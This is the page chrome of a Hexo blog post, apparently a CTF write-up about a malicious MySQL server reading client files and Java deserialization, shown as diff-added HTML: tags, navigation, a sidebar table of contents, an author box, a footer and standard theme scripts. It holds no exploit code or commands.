+              <a href="/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/" rel="tag"># mysql恶意服务端读取客户端文件</a>
+              <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># java反序列化</a>
+              <a href="/tags/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9F%A5%E8%AF%86/" rel="tag"># java动态代理知识</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/" rel="prev" title="(2021祥云杯)cralwer_z">
+      <i class="fa fa-chevron-left"></i> (2021祥云杯)cralwer_z
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.</span> <span class="nav-text">0x01 源码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Amysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number"></span> <span class="nav-text">0x02 解法一：mysql恶意服务端读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Amysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">0x02 解法二：mysql恶意服务端+java反序列化</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">nappingCat</p>
+  <div class="site-description" itemprop="description">2571374157@qq.com</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nappingCat</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
